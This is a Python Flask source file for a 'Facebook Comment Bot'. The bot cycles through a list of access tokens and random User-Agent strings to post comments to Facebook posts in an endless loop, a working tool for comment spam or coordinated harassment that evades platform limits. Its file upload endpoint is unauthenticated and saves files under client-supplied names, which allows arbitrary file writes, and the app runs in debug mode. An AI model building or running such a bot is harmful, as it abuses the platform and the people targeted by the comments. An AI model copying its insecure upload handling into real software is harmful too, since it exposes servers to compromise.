from flask import Flask, request, jsonify, render_template_string
import threading
import requests
import time
import os
import random
import glob
import datetime
import pytz
import logging

app = Flask(__name__)

# ✅ लॉग फ़ाइल सेटअप
log_filename = "bot_logs.txt"
logging.basicConfig(filename=log_filename, level=logging.INFO, 
                    format="%(asctime)s - %(levelname)s - %(message)s", encoding="utf-8")

# ✅ Uptime Tracking
start_time = time.time()

def get_uptime():
    elapsed_time = time.time() - start_time
    return str(datetime.timedelta(seconds=int(elapsed_time)))

# ✅ IST Time
def get_ist_time():
    utc_now = datetime.datetime.now(datetime.UTC)
    ist = pytz.timezone('Asia/Kolkata')
    ist_now = utc_now.astimezone(ist)
    return ist_now.strftime("%Y-%m-%d %I:%M:%S %p")

# ✅ Read File
def read_file(filename):
    if os.path.exists(filename):
        with open(filename, 'r', encoding="utf-8") as file:
            return [line.strip() for line in file.readlines() if line.strip()]
    return []

# ✅ User-Agents
user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.120 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Mobile Safari/537.36"
] * 12  # 50+ User-Agents

# ✅ Global Variables
is_running = False
thread = None
logs = []

# ✅ Log Function (Console + File)
def log_message(msg):
    timestamped_msg = f"[{get_ist_time()}] {msg}"
    logs.append(timestamped_msg)
    print(timestamped_msg)
    logging.info(timestamped_msg)  # ✅ फ़ाइल में सेव करें

# ✅ Comment Posting
def post_comments():
    global is_running

    tokens_file = "tokennum.txt"
    time_file = "time.txt"
    post_urls_file = "post_url.txt"
    comments_files = glob.glob("comments*.txt")

    access_tokens = read_file(tokens_file)
    post_urls = read_file(post_urls_file)
    comments = [line for file in comments_files for line in read_file(file)]
    speed_list = read_file(time_file)
    speed = int(speed_list[0]) if speed_list else 5

    if not access_tokens or not post_urls or not comments:
        log_message("❌ Error: Missing or empty files!")
        return

    num_tokens = len(access_tokens)
    message_count = 0

    while is_running:
        try:
            for post_url in post_urls:
                for comment_index, comment in enumerate(comments):
                    if not is_running:
                        return

                    token_index = comment_index % num_tokens
                    access_token = access_tokens[token_index]
                    random_user_agent = random.choice(user_agents)

                    headers = {'User-Agent': random_user_agent, 'Accept': 'application/json'}
                    url = f"https://graph.facebook.com/{post_url}/comments"
                    parameters = {'access_token': access_token, 'message': comment}
                    response = requests.post(url, json=parameters, headers=headers)

                    if response.status_code != 200:
                        log_message(f"❌ Error: {response.json().get('error', 'Unknown error')}")
                        continue

                    message_count += 1
                    uptime = get_uptime()
                    log_message(f"✅ Comment {message_count} sent | Post: {post_url} | Token {token_index + 1}: {comment}")
                    
                    time.sleep(speed)

            log_message("✅ All comments sent. Restarting...")

        except Exception as e:
            log_message(f"❌ Error: {e}")
            time.sleep(5)

# ✅ Start Bot
@app.route('/start', methods=['GET'])
def start_bot():
    global is_running, thread

    if not is_running:
        is_running = True
        thread = threading.Thread(target=post_comments)
        thread.start()
        log_message("🚀 Bot started successfully!")
        return jsonify({"status": "started", "message": "Bot started successfully!"})
    
    return jsonify({"status": "running", "message": "Bot is already running!"})

# ✅ Stop Bot
@app.route('/stop', methods=['GET'])
def stop_bot():
    global is_running

    if is_running:
        is_running = False
        log_message("🛑 Bot stopped successfully!")
        return jsonify({"status": "stopped", "message": "Bot stopped successfully!"})
    
    return jsonify({"status": "not running", "message": "Bot is not running!"})

# ✅ Get Logs (Last 50 logs)
@app.route('/logs', methods=['GET'])
def get_logs():
    return jsonify({"logs": logs[-50:]})

# ✅ Download Log File
@app.route('/download-log', methods=['GET'])
def download_log():
    return open(log_filename).read()

# ✅ Upload File
@app.route('/upload', methods=['POST'])
def upload_file():
    if 'file' not in request.files:
        return jsonify({"error": "No file part"})
    
    file = request.files['file']
    if file.filename == '':
        return jsonify({"error": "No selected file"})
    
    file.save(os.path.join(os.getcwd(), file.filename))
    log_message(f"📂 {file.filename} uploaded successfully!")
    return jsonify({"success": f"{file.filename} uploaded successfully!"})

# ✅ Home Page (Embedded HTML)
@app.route('/')
def index():
    html_content = """
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Facebook Bot</title>
        <style>
            body { font-family: Arial, sans-serif; text-align: center; padding: 20px; }
            button { margin: 10px; padding: 10px 20px; font-size: 16px; }
            pre { background: #f4f4f4; padding: 10px; max-height: 300px; overflow-y: auto; }
        </style>
    </head>
    <body>
        <h1>Facebook Comment Bot</h1>
        
        <button onclick="startBot()">Start Bot</button>
        <button onclick="stopBot()">Stop Bot</button>

        <h2>Upload File</h2>
        <input type="file" id="fileInput">
        <button onclick="uploadFile()">Upload</button>

        <h2>Logs</h2>
        <pre id="logs"></pre>

        <h2>Download Logs</h2>
        <a href="/download-log" download>Download Log File</a>

        <script>
            function startBot() {
                fetch('/start').then(res => res.json()).then(data => alert(data.message));
            }

            function stopBot() {
                fetch('/stop').then(res => res.json()).then(data => alert(data.message));
            }

            function uploadFile() {
                let fileInput = document.getElementById("fileInput").files[0];
                let formData = new FormData();
                formData.append("file", fileInput);
                fetch('/upload', { method: "POST", body: formData })
                    .then(res => res.json()).then(data => alert(data.success || data.error));
            }

            function fetchLogs() {
                fetch('/logs').then(res => res.json()).then(data => {
                    document.getElementById("logs").innerText = data.logs.join("\\n");
                });
            }
            
            setInterval(fetchLogs, 5000);
        </script>
    </body>
    </html>
    """
    return render_template_string(html_content)

if __name__ == '__main__':
    app.run(debug=True, port=5000)
